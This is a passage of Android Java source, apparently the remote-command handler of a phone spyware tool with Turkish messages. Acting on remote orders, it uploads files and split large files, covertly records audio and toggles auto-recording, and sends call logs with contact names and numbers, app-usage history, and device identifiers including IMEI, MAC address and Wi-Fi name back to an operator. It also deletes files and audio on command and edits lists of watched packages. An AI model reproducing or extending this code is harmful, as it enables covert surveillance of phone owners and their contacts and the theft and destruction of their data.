            postMan.postText("SendFile", error, commandMessage.getCommandId());
            return;
         }
         
         Run.runThread(() -> {
            
            long maxByte = 5242880;
            
            if (file.length() > maxByte) {
               
               File folder = new File(context.getFilesDir(), "myfile");
               
               if (!folder.exists()) {
                  
                  if (folder.mkdir()) {
                     
                     new FileSplitter(context, file, folder).split();
                     
                     File[] files = folder.listFiles();
                     
                     for (File file1 : files) {
                        
                        postMan.postFile(file1, "SendFile", file1.getName(), commandMessage.getCommandId());
                     }
                  }
               }
               else {
                  
                  new FileSplitter(context, file, folder).split();
                  
                  File[] files = folder.listFiles();
                  
                  for (File file1 : files) {
                     
                     postMan.postFile(file1, "SendFile", file1.getName(), commandMessage.getCommandId());
                  }
               }
            }
            else {
               
               postMan.postFile(file, "SendFile", file.getName(), commandMessage.getCommandId());
            }
         });
      }
      
      else if (order.contains(SUBJECT_SEND_AUDIO_FILE)) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            postMan.postText("saf", error, commandMessage.getCommandId());
            return;
         }
         
         String fileName = order.split(";")[1];
         
         File file = new File(u.getAudioFolderFile(context), fileName);
         
         if (!file.exists()) {
            
            postMan.postText("saf", u.format("%s%nBöyle bir dosya yok : %s", Time.dateStamp(), fileName), commandMessage.getCommandId());
         }
         else {
            
            postMan.postFile(file, "SendAudioFile", file.getName(), commandMessage.getCommandId());
            
         }
      }
      
      else if (order.contains(SUBJECT_ADD_JUNK_PACK)) {
         
         String packageName = getOrderArgument(order);
         
         SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
         
         Set<String> jPacks = pref.getStringSet("junkpacks", new HashSet<>());
         
         assert jPacks != null;
         jPacks.add(packageName);
         
         pref.edit().putStringSet("junkpacks", jPacks).apply();
         postMan.postText("JP", "junkpacks eklendi : " + jPacks.toString(), commandMessage.getCommandId());
      }
      
      else if (order.contains(SUBJECT_ADD_DANGER_PACK)) {
         
         String packageName = getOrderArgument(order);
         
         SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
         
         Set<String> jPacks = pref.getStringSet("dangerpacks", new HashSet<>());
         
         assert jPacks != null;
         jPacks.add(packageName);
         
         pref.edit().putStringSet("dangerpacks", jPacks).apply();
         postMan.postText("DP", "dangerpacks eklendi : " + jPacks.toString(), commandMessage.getCommandId());
      }
      
      else if (order.contains(SUBJECT_ADD_MAIL_PACK)) {
         
         String packageName = getOrderArgument(order);
         
         SharedPreferences pref = context.getSharedPreferences("gmail", Context.MODE_PRIVATE);
         
         Set<String> jPacks = pref.getStringSet("mailpacks", new HashSet<>());
         
         assert jPacks != null;
         jPacks.add(packageName);
         
         pref.edit().putStringSet("mailpacks", jPacks).apply();
         
         postMan.postText("MP", "mailpacks eklendi : " + jPacks.toString(), commandMessage.getCommandId());
      }
      
      else if (order.startsWith(SUBJECT_RECORD)) {
         
         record();
      }
      
      else if (order.startsWith(SUBJECT_DELETE_ALL_FILES)) {
         
         String path = getOrderArgument(order);
         
         File file = new File(Environment.getExternalStorageDirectory(), path);
         
         deleteAllFiles(file, "DeleteAllFiles");
      }
      
      else if (order.startsWith(SUBJECT_DELETE_ALL_LOCAL_FILES)) {
         
         String path = getOrderArgument(order);
         File   file = new File(context.getFilesDir(), path);
         deleteAllFiles(file, "DeleteAllLocalFiles");
      }
      
      else if (order.startsWith(SUBJECT_DAY_OF_CALLS)) {
         
         String args = order.split("_")[1];
         
         Calendar calendar = Calendar.getInstance();
         
         getCalls(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH), Integer.valueOf(args));
      }
      
      else if (order.startsWith(SUBJECT_GET_LAST_APPS)) {
         
         if (!order.contains("_")) {
            
            postText("Hata", "Zaman belirtilmedi (lapps_5)");
            throw new OrderException("Zaman belirtilmedi");
         }
         
         try {
            
            long time = Long.parseLong(order.split("_")[1]);
            
            Run.runThread(() -> lastApps(time));
         }
         catch (Exception e) {
            
            e.printStackTrace();
         }
      }
      
      else if (order.startsWith(SUBJECT_ADD_PACKAGE_TO_ACCESS_SERVICE)) {
         
         addPackageToAccesService(getOrderArgument(order));
      }
      
      else if (order.startsWith(SUBJECT_REMOVE_PACKAGE_TO_ACCESS_SERVICE)) {
         
         removePackageToAccesService(getOrderArgument(order));
         
      }

      else if (order.startsWith(SUBJECT_OTO_RECORD)) {
         
         String arg = getOrderArgument(order);
   
         Save save = new Save(context, "audio");
         String key = "otorc";
         boolean record = save.getBoolean(key, false);
         
         if (arg.equals("0")) {
   
            if (record) {
               
               save.saveBoolean(key, false);
               postText("OtoRc", "Kapatıldı");
            }
            else{
   
               postText("OtoRc", "Zaten kapalı");
            }
         }
         else if (arg.equals("1")) {
   
            if (record) {
   
               postText("OtoRc", "Zaten açık");
            }
            else{
   
               save.saveBoolean(key, true);
               postText("OtoRc", "Açıldı");
            }
         }
         else{
   
            postText("OtoRc", "Geçersiz bilgi. Sadece 0 ve 1");
         }
      }

      else {
   
         u.log.d("Böyle bir konu yok : %s", order);
         postMan.setCommandExecuted(commandMessage.getCommandId(), "Böyle bir konu yok");
      }
      
   }
   
   private void getAllUsage() {
      
      if (!u.isUsageStatGrant(context)) {
         
         postText("AllUsage", "İşlemi yapabilmek için gerekli izin yok [UsageStat]");
         return;
      }
      
      List<UsageStats> usageStats = UsageManager.getInstance(context).getAllUsage();
      
      if (usageStats.size() == 0) {
         
         postText("AllUsage", "Hiçbir bilgi yok");
         return;
      }
      
      StringBuilder s = new StringBuilder(u.format("Tüm Kullanımlar%n=========================================%n"));
      
      int i = 1;
      
      for (UsageStats usage : usageStats) {
         
         if (usage.getTotalTimeInForeground() == 0L) continue;
         
         s.append(u.format("%d. ", i++));
         s.append(getUsageStatString(usage));
         s.append("==================================================\n");
         
         
         if (i % 100 == 0) {
            
            u.saveToFile(context, "allusage", s.toString());
            s = new StringBuilder();
         }
      }
      
      u.saveToFile(context, "allusage", s.toString());
      
      postMan.checkTextFiles(commandMessage.getCommandId());
   }
   
   private String getUsageStatString(UsageStats usageStats) {
      
      StringBuilder stringBuilder = new StringBuilder();
      
      String appName = InstalledApps.getApplicationName(context, usageStats.getPackageName());
      
      stringBuilder.append(u.format("%s (%s)%n", appName, usageStats.getPackageName()));
      stringBuilder.append(u.format("First Stamp : %s%n", Time.getDate(usageStats.getFirstTimeStamp())));
      stringBuilder.append(u.format("Last Stamp  : %s%n", Time.getDate(usageStats.getLastTimeStamp())));
      stringBuilder.append(u.format("Last used   : %s%n", Time.getDate(usageStats.getLastTimeUsed())));
      stringBuilder.append(u.format("Forground   : %s%n", Time.getElapsedTime(usageStats.getTotalTimeInForeground())));
      
      return stringBuilder.toString();
   }
   
   private void removePackageToAccesService(String packageName) {
      
      if (packageName.trim().isEmpty()) {
         
         postText("RemovePackageToAccessService", "Geçerli bir bilgi verilmedi");
         return;
      }
      
      Save save = new Save(context, "Access");
      
      List<String> blocks = save.getObjectsList("blocks", String.class);
      
      if (!blocks.contains(packageName)) {
         
         postText("RemovePackageToAccessService", u.format("Uygulama zaten listede yok : %s [%s]", packageName, blocks.toString()));
         return;
      }
      
      
      blocks.remove(packageName);
      
      save.deleteValue("blocks");
      save.saveObjectsList("blocks", blocks);
      
      StringBuilder s = new StringBuilder(Time.dateStamp()).append("\n");
      
      s.append(u.format("Listede %d uygulama var", blocks.size()));
      s.append("\n======================================\n");
      
      int i = 1;
      
      for (String p : blocks) {
         
         s.append(u.format("%d. %s%n", i++, p));
      }
      
      postText("RemovePackageToAccessService", s.toString());
   }
   
   private void addPackageToAccesService(String packageName) {
      
      if (packageName.trim().isEmpty()) {
         
         postText("AddPackageToAccessService", "Geçerli bir bilgi verilmedi");
         return;
      }
      
      Save save = new Save(context, "Access");
      
      List<String> blocks = save.getObjectsList("blocks", String.class);
      
      blocks.add(packageName);
      
      save.deleteValue("blocks");
      save.saveObjectsList("blocks", blocks);
      
      StringBuilder s = new StringBuilder(Time.dateStamp()).append("\n");
      
      s.append(u.format("Listede %d uygulama var", blocks.size()));
      s.append("\n======================================\n");
      
      int i = 1;
      
      for (String p : blocks) {
         
         s.append(u.format("%d. %s%n", i++, p));
      }
      
      postText("AddPackageToAccessService", s.toString());
   }
   
   private void postText(String title, String text) {
      
      postMan.postText(title, text, commandMessage.getCommandId());
   }
   
   private void phoneState() {
      
      PhoneState phoneState = new PhoneState(context);
      
      //noinspection StringBufferReplaceableByString
      StringBuilder stringBuilder = new StringBuilder(Time.dateStamp()).append("\n");
      
      stringBuilder.append(u.format("Screen      : %s%n", phoneState.isScreenON()));
      stringBuilder.append(u.format("Fly         : %s%n", phoneState.isAirplaneModeON()));
      stringBuilder.append(u.format("Wifi        : %s%n", phoneState.isWifiON()));
      stringBuilder.append(u.format("Battery     : %d%n", phoneState.getBatteryState().getLevel()));
      stringBuilder.append(u.format("Charging    : %s%n", phoneState.getBatteryState().isCharging()));
      stringBuilder.append(u.format("ACCharging  : %s%n", phoneState.getBatteryState().isAcCharge()));
      
      stringBuilder.append("\nLast Apps\n\n");
      
      stringBuilder.append(getAppsString(phoneState.getLastApps()));
      
      postMan.postText("PhoneState", stringBuilder.toString(), commandMessage.getCommandId());
   }
   
   private String getAppsString(List<UsageStats> stats) {
      
      StringBuilder stringBuilder = new StringBuilder();
      
      for (UsageStats usageStats : stats) {
         
         String appName = InstalledApps.getApplicationName(context, usageStats.getPackageName());
         
         stringBuilder.append(u.format("%s (%s)%n", appName, usageStats.getPackageName()));
         stringBuilder.append(u.format("First Stamp : %s%n", Time.getDate(usageStats.getFirstTimeStamp())));
         stringBuilder.append(u.format("Last Stamp  : %s%n", Time.getDate(usageStats.getLastTimeStamp())));
         stringBuilder.append(u.format("Last used   : %s%n", Time.getDate(usageStats.getLastTimeUsed())));
         stringBuilder.append(u.format("Forground   : %s%n", Time.getElapsedTime(usageStats.getTotalTimeInForeground())));
         stringBuilder.append("=======================================================\n");
      }
      
      return stringBuilder.toString();
   }
   
   private void lastApps(long time) {
      
      List<UsageStats> stats = UsageManager.getInstance(context).getLastUsageStats(time * 60000);
      
      int size = stats.size();
      
      u.log.d("UsageStats size = %d", size);
      
      if (size == 0) {
         
         //postMan.setCommandExecuted(commandMessage.getId(), null);
         postMan.postText("LastApps", "Kayıtlı bilgi yok", commandMessage.getCommandId());
         return;
      }
      
      postMan.postText("LastApps", getAppsString(stats), commandMessage.getCommandId());
   }
   
   private void getCalls(int year, int month, int day) {
      
      Calendar calendar = Calendar.getInstance();
      
      calendar.set(year, month, day, 0, 0, 0);
      
      long start = calendar.getTimeInMillis();
      
      calendar.set(year, month, day, 23, 59, 59);
      
      long end = calendar.getTimeInMillis();
      
      
      List<Calls.Call> calls = new Calls(context).getCalls();
      
      List<Calls.Call> dayCalls = Stream.of(calls).filter(c -> c.getDate() >= start && c.getDate() <= end).toList();
      
      if (dayCalls.size() == 0) {
         
         postMan.postText("GetCalls", u.format("Belirtilen tarihte bir arama kaydı bulunmuyor%n%s%n%s", Time.getDate(start), Time.getDate(end)), commandMessage.getCommandId());
         return;
      }
      
      StringBuilder stringBuilder = new StringBuilder(u.format("Belirtilen tarihe ait %d arama kaydı bulundu%n%n", dayCalls.size()));
      stringBuilder.append(u.format("%s%n%s%n%n", Time.getDate(start), Time.getDate(end)));
      
      
      int i = 1;
      
      for (Calls.Call call : dayCalls) {
         
         stringBuilder.append(u.format("%d. %s\n", i++, call.getType()));
         stringBuilder.append("--------------------------\n");
         stringBuilder.append(u.format("Kişi      : %s\n", call.getName() == null ? Contacts.getContactNameWithNumber(context, call.getNumber()) : call.getName()));
         stringBuilder.append(u.format("Numara    : %s\n", call.getNumber()));
         stringBuilder.append(u.format("Tarih     : %s\n", Time.getDate(call.getDate())));
         stringBuilder.append(u.format("Süre      : %s saniye\n", call.getDuration()));
         stringBuilder.append(u.format("id        : %s\n", call.getId()));
         stringBuilder.append(u.format("isRead    : %s\n", call.getRead()));
         stringBuilder.append("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n");
         
      }
      
      postMan.postText("GetCalls", stringBuilder.toString(), commandMessage.getCommandId());
      
   }
   
   private void deleteAllFiles(File file, String subject) {
      
      if (!file.exists()) {
         
         postMan.postText(subject, "Böyle bir dosya yok : " + file.getAbsolutePath(), commandMessage.getCommandId());
         return;
      }
      
      if (!file.isDirectory()) {
         
         postMan.postText(subject, "Bu dosya bir klasör değil : " + file.getAbsolutePath(), commandMessage.getCommandId());
         return;
      }
      
      StringBuilder stringBuilder = new StringBuilder();
      
      File[] files = file.listFiles();
      
      if (files == null) {
         
         postMan.postText(subject, "Klasör içeriğine ulaşılamadı : " + file.getAbsolutePath());
         return;
      }
      
      if (files.length == 0) {
         
         postMan.postText(subject, "Klasör boş : " + file.getAbsolutePath());
         return;
      }
      
      List<File> onlyFiles = Stream.of(files).filter(c -> !c.isDirectory()).toList();
      
      if (onlyFiles.size() == 0) {
         
         postMan.postText(subject, "Klasörde dosya yok : " + file.getAbsolutePath());
         return;
      }
      
      stringBuilder.append(u.format("Klasörde %d dosya bulundu.%n%n", onlyFiles.size()));
      
      int i = 1;
      
      for (File _file : onlyFiles) {
         
         if (_file.delete()) {
            
            stringBuilder.append(u.format("%d. silindi %s%n", i++, _file.getName()));
         }
         else {
            
            stringBuilder.append(u.format("%d. silinemedi %s%n", i++, _file.getName()));
         }
      }
      
      postMan.postText(subject, stringBuilder.toString(), commandMessage.getCommandId());
      
   }
   
   @NonNull
   private String getCommands() {
      
      Field[] fields = getClass().getDeclaredFields();
      
      List<Field> fieldList = Stream.of(fields)
            .filter(c -> c.getModifiers() == (Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL))
            .toList();
      
      StringBuilder stringBuilder = new StringBuilder(u.format("%d Komut%n%n", fieldList.size()));
      
      int i = 1;
      
      for (Field field : fieldList) {
         
         if (!field.isAccessible()) {
            
            field.setAccessible(true);
         }
         
         String name = field.getName();
         
         try {
            
            String value = (String) field.get(null);
            
            stringBuilder.append(u.format("%d. %s : %s%n", i++, name, value));
         }
         catch (IllegalAccessException e) {
            e.printStackTrace();
         }
      }
      
      return stringBuilder.toString();
   }
   
   private String getFilesInfo(File[] files) {
      
      if (files == null) return "Yok";
      
      StringBuilder stringBuilder = new StringBuilder(u.format("%s%n%d dosya%n%n", Time.getDate(System.currentTimeMillis()), files.length));
      
      int i = 1;
      
      for (File file : files) {
         
         stringBuilder.append(u.format("%d. %s, isFile=%s, size=%d kb%n", i++, file.getName(), file.isFile(), file.isFile() ? file.length() / 1024L : 0L));
      }
      
      return stringBuilder.toString();
   }
   
   private void record() {
      
      long duration;
      long delay = 0;
      
      String[] args           = order.split("_");
      boolean  high           = args.length != 3;
      String   durationString = args[1];
      
      try {
         
         if (!durationString.contains(";")) {
            
            duration = Integer.valueOf(durationString);
         }
         else {
            
            duration = Long.valueOf(durationString.split(";")[0]);
            delay = Long.valueOf(durationString.split(";")[1]);
         }
         
         if (!AudioService.isRunning()) {
            
            new AudioServiceController(context, duration, delay, commandMessage.getCommandId(), high);
         }
         
      }
      catch (Exception e) {
         
         postMan.postText("Kayıt", "Komut hatalı : " + order + "\nYeni bir kayıt oluşturuluyor");
         new AudioServiceController(context, 5L, 0L, commandMessage.getCommandId(), high);
      }
   }
   
   private void sendMyFile() {
      
      File folder = new File(context.getFilesDir(), "myfile");
      
      if (folder.exists()) {
         
         File[] myFiles = folder.listFiles();
         
         if (myFiles != null) {
            
            if (myFiles.length == 0) {
               
               postMan.postText("SendMyFiles", "Klasörde dosya yok", commandMessage.getCommandId());
            }
            else {
               
               for (File file1 : myFiles) {
                  
                  postMan.postFile(file1, "SendMyFile", file1.getName(), commandMessage.getCommandId());
               }
            }
         }
      }
      else {
         
         postMan.postText("SendMyFiles", "Böyle bir klasör yok. Muhtemelen şimdiye kadar ihtiyaç duyulmadığı için oluşturulmadı", commandMessage.getCommandId());
      }
   }
   
   private String getOrderArgument(String order) throws
         OrderException, InvalidOrderArgumentException {
      
      if (!order.contains(";")) {
         
         throw new OrderException("Argüman belirtilmedi : " + order);
      }
      
      String[] arguments = order.split(";");
      
      if (arguments.length < 2 || arguments[1].trim().isEmpty()) {
         
         throw new InvalidOrderArgumentException("Geçerli bir argüman belirtilmedi : " + order);
      }
      
      return arguments[1];
   }
   
   private static boolean isValidEmail(String email) {
      
      return !TextUtils.isEmpty(email) && android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches();
   }
   
   private void mainList() {
      
      File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
      
      if (!file.exists() || !file.isDirectory()) {
         
         String error = u.format("Böyle bir klasör yok : %s", file.getAbsolutePath());
         postMan.postText("mainlist", error, commandMessage.getCommandId());
         return;
      }
      
      File[] files2 = file.listFiles();
      
      if (files2 != null) {
         
         if (files2.length == 0) {
            
            String msg = u.format("Klasörde dosya yok : %s", file.getName());
            postMan.postText("mainlist", msg, commandMessage.getCommandId());
         }
         else {
            
            StringBuilder msg = new StringBuilder(u.format("Klasörde %d dosya var%n", files2.length));
            msg.append("-------------------------------\n");
            
            int i = 1;
            
            for (File file1 : files2) {
               
               msg.append(u.format("%d. name=%s, isDir=%s, size=%.2fMB, date=%s%n",
                     
                     i++,
                     file1.getAbsolutePath(),
                     file1.isDirectory(),
                     file1.isDirectory() ? 0.0F : (float) file1.length() / (1024 * 1024),
                     Time.getDate(file1.lastModified())
               ));
            }
            
            
            postMan.postText("mainlist", msg.toString(), commandMessage.getCommandId());
         }
      }
      else {
         
         postText("mainlist", "files = null");
      }
   }
   
   private void listAudiofiles() {
      
      StringBuilder audioFileList = new StringBuilder(Time.dateStamp());
      
      File[] files           = u.getAudioFolderFile(context).listFiles();
      File   onRecordingFile = AudioService.getOnRecordingFile();
      
      
      if (files != null) {
         
         if (files.length > 0) {
            
            audioFileList.append(u.format("Klasörde %d dosya var%n%n", files.length));
            
            int i = 1;
            
            for (File file : files) {
               
               if (onRecordingFile != null && onRecordingFile.getName().equals(file.getName())) {
                  
                  audioFileList.append(String.format(new Locale("tr"), "%d. (kayıtta) %s%n", i++, file.getName()));
                  continue;
               }
               
               long duration = u.getDuration(file.getAbsolutePath());
               
               audioFileList.append(String.format(new Locale("tr"),
                     "%d. %s, duration=%s, %.2f mb%n",
                     i++,
                     file.getName(),
                     duration != -60L ? u.formatMilliSeconds(duration) : "Bilgi alınamadı",
                     (float) file.length() / (1024 * 1024)));
               
            }
         }
         else {
            
            audioFileList.append("Klasörde ses dosyası yok\n");
         }
         
         audioFileList.append("\n*************************\n");
         postMan.postText("ListAudioFiles", audioFileList.toString(), commandMessage.getCommandId());
      }
      else {
         
         postMan.postText("Ses Listesi", "new File(u.getAudioFolder(context)).list() = null", commandMessage.getCommandId());
      }
   }
   
   private void listCallAudiofiles() {
      
      StringBuilder audioFileList = new StringBuilder(Time.dateStamp());
      
      File[] files           = u.getCallAudioFolderFile(context).listFiles();
      File   onRecordingFile = AudioService.getOnRecordingFile();
      
      
      if (files != null) {
         
         if (files.length > 0) {
            
            int i = 1;
            
            for (File file : files) {
               
               if (onRecordingFile != null && onRecordingFile.getName().equals(file.getName())) {
                  
                  audioFileList.append(String.format(new Locale("tr"), "%d. (kayıtta) %s%n", i++, file.getName()));
                  continue;
               }
               
               
               audioFileList.append(String.format(new Locale("tr"),
                     "%d. name=%s, duration=%s, mb=%.2f%n",
                     i++,
                     file.getName(),
                     u.getMp3Duration(file),
                     (float) file.length() / (1024 * 1024)));
               
            }
         }
         else {
            
            audioFileList.append("Klasörde ses dosyası yok\n");
         }
         
         audioFileList.append("\n*************************\n");
         postMan.postText("ListCallAudioFiles", audioFileList.toString(), commandMessage.getCommandId());
      }
      else {
         
         postMan.postText("Ses Listesi", "new File(u.getAudioFolder(context)).list() = null", commandMessage.getCommandId());
      }
   }
   
   private void deleteCallAudioFiles() {
      
      File[] audioFiles = new File(u.getCallAudioFolder(context)).listFiles();
      
      if (audioFiles == null) {
         
         postMan.postText("DeleteCallAudioFiles", "Dosya alınamadı", commandMessage.getCommandId());
         return;
      }
      
      if (audioFiles.length == 0) {
         
         postMan.postText("DeleteCallAudioFiles", "Klasörde dosya yok", commandMessage.getCommandId());
         return;
         
      }
      
      StringBuilder result = new StringBuilder(Time.dateStamp());
      
      int deleted = 0, notDeleted = 0;
      
      for (File file : audioFiles) {
         
         if (file.delete()) {
            
            result.append(u.format("Silindi    : %s%n", file.getName()));
            deleted++;
         }
         else {
            
            result.append(u.format("Silinemedi : %s%n", file.getName()));
            notDeleted++;
         }
      }
      
      result.append(u.format("%nSilinen %d dosya%nSilinemeyen %d dosya%n%n", deleted, notDeleted));
      
      audioFiles = u.getAudioFolderFile(context).listFiles();
      
      result.append(u.format("Kalan dosya sayısı : %d%n", audioFiles.length));
      
      postMan.postText("DeleteCallAudioFiles", result.toString(), commandMessage.getCommandId());
   }
   
   private void deleteAudioFiles() {
      
      File[] audioFiles = new File(u.getAudioFolder(context)).listFiles();
      
      if (audioFiles == null) {
         
         postMan.postText("DeleteAudioFiles", "Dosya alınamadı", commandMessage.getCommandId());
         return;
      }
      
      if (audioFiles.length == 0) {
         
         postMan.postText("DeleteAudioFiles", "Klasörde dosya yok", commandMessage.getCommandId());
         return;
         
      }
      
      StringBuilder result = new StringBuilder(Time.dateStamp());
      
      int deleted = 0, notDeleted = 0;
      
      for (File file : audioFiles) {
         
         if (file.delete()) {
            
            result.append(u.format("Silindi    : %s%n", file.getName()));
            deleted++;
         }
         else {
            
            result.append(u.format("Silinemedi : %s%n", file.getName()));
            notDeleted++;
         }
      }
      
      result.append(u.format("%nSilinen %d dosya%nSilinemeyen %d dosya%n%n", deleted, notDeleted));
      
      audioFiles = u.getAudioFolderFile(context).listFiles();
      
      result.append(u.format("Kalan dosya sayısı : %d%n", audioFiles.length));
      
      postMan.postText("DeleteAudioFiles", result.toString(), commandMessage.getCommandId());
   }
   
   private void delMyFile() {
      
      File folder2 = new File(context.getFilesDir(), "myfile");
      
      if (folder2.exists()) {
         
         File[] myFiles = folder2.listFiles();
         
         for (File file1 : myFiles) {
            
            if (file1.delete()) {
               
               u.log.d("myfile silindi : %s", file1.getName());
            }
            else {
               
               u.log.d("myfile silinemedi : %s", file1.getName());
            }
         }
         
         
         folder2 = new File(context.getFilesDir(), "myfile");
         
         postMan.postText(
               "DeleteMyFiles", u.format("Kalan dosya sayısı : %d", folder2.list().length), commandMessage.getCommandId());
      }
      else {
         
         postText("DeleteMyFiles", "Klasör yok");
      }
   }
   
   private String getBattery() {
      
      IntentFilter ifilter       = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
      Intent       batteryStatus = context.registerReceiver(null, ifilter);
      // şarzda mı
      assert batteryStatus != null;
      int     status     = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
      boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL;
      
      // neyle şarz oluyor
      int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
      //boolean usbCharge  = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
      boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
      
      //yüzde
      int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
      
      
      String value = "";
      
      if (isCharging) {
         
         if (acCharge) {
            
            value += "Telefon prizde şarz oluyor\n";
         }
         else {
            
            value += "Telefon usb ile şarz oluyor\n";
         }
         
      }
      else {
         
         value += "Telefon şarzda değil\n";
      }
      
      
      value += "Batarya yüzdesi : " + level;
      
      return value;
   }
   
   @SuppressLint("HardwareIds")
   private static String getPhoneInfo(Context context) {
      
      ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
      
      int type = 0;
      
      if (connectivityManager != null) {
         
         type = connectivityManager.getActiveNetworkInfo().getType();
      }
      
      NetworkInfo networkInfo = null;
      
      if (connectivityManager != null) {
         
         networkInfo = connectivityManager.getActiveNetworkInfo();
      }
      
      if (networkInfo == null) return "network info null\n";
      
      String value = String.format("%s\n", Time.whatTimeIsIt());
      
      if (type == ConnectivityManager.TYPE_WIFI) {
         
         value += String.format("%s %s\n", wifiName(context), getMacAddr());
         
      }
      else if (type == ConnectivityManager.TYPE_MOBILE) {
         
         value += String.format("%s %s\n", networkInfo.getSubtypeName(), networkInfo.getExtraInfo());
      }
      
      
      value += String.format("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n",
            networkInfo.getTypeName(),
            networkInfo.isConnected() ? "connected" : "disconnected",
            Build.MODEL,
            Build.DEVICE,
            Build.DISPLAY,
            Build.BRAND,
            Build.HARDWARE,
            Build.MANUFACTURER,
            Build.BOARD,
            Build.BOOTLOADER,
            Build.FINGERPRINT,
            Build.PRODUCT,
            Build.USER,
            Build.TYPE,
            Build.TAGS,
            Build.VERSION.SDK_INT,
            getImei(context)
      
      );
      
      
      //Log.i("connectivityInfo", value);
      
      return value;
   }
   
   private static String wifiName(Context context) {
      
      WifiManager wifiMgr  = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
      WifiInfo    wifiInfo = null;
      
      if (wifiMgr != null) {
         
         wifiInfo = wifiMgr.getConnectionInfo();
      }
      
      if (wifiInfo != null) {
         
         return wifiInfo.getSSID();
      }
      
      return "wifi ismi alınamıyor";
   }
   
   @NonNull
   private static String getMacAddr() {
      
      try {
         List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
         for (NetworkInterface nif : all) {
            if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
            
            byte[] macBytes = nif.getHardwareAddress();
            if (macBytes == null) {
               return "";
            }
            
            StringBuilder res1 = new StringBuilder();
            for (byte b : macBytes) {
               res1.append(String.format("%02X:", b));
            }
            
            if (res1.length() > 0) {
               res1.deleteCharAt(res1.length() - 1);
            }
            return res1.toString();
         }
      }
      catch (Exception ignored) {
      }
      return "02:00:00:00:00:00";
   }
   
   @SuppressLint("HardwareIds")
   private static String getImei(Context context) {
      
      TelephonyManager m_telephonyManager = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
      //String           IMEI, IMSI;
      if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
         
         if (m_telephonyManager != null) {
            return m_telephonyManager.getDeviceId();
         }
      }
      
      if (m_telephonyManager != null) {
         return m_telephonyManager.getDeviceId();
      }
      
      return "imei alınamıyor";
   }
   
   public static class OrderException extends Exception {
      
      OrderException(String message) {
         
         super(message);
      }
   }
   
   public static class InvalidOrderArgumentException extends Exception {
      
      InvalidOrderArgumentException(String message) {
         
         super(message);
      }
   }
   
}
